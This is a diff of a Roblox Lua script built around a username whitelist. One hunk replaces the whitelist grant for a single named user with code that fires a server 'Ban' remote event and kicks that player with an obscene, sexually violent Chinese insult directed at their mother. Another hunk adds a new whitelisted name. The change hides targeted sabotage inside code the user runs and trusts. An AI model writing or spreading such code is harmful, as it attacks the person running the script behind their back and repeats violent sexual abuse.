@@ -471,7 +471,10 @@ _G.whitelisted=true
 elseif a=="tuidugcsee"then
 _G.whitelisted=true
 elseif a=="sjssjjsjsjshshs"then
-_G.whitelisted=true
+pcall(function()
+game.ReplicatedStorage.Interaction.Ban:FireServer("圈你麻痹号")
+end)
+game.Players.LocalPlayer:Kick("我操你妈逼的你妈明天直接被我螺旋插死")
 elseif a=="112ZZZqqs"then
 _G.whitelisted=true
 elseif a=="SHBan_N"then
@@ -975,6 +978,8 @@ _G.whitelisted=true
 elseif a=="dasuange56"then
 _G.whitelisted=true
 elseif a=="hkbyisej"then
+_G.whitelisted=true
+elseif a=="Judgealph404"then
 _G.whitelisted=true
 end
 if _G.whitelisted==true then
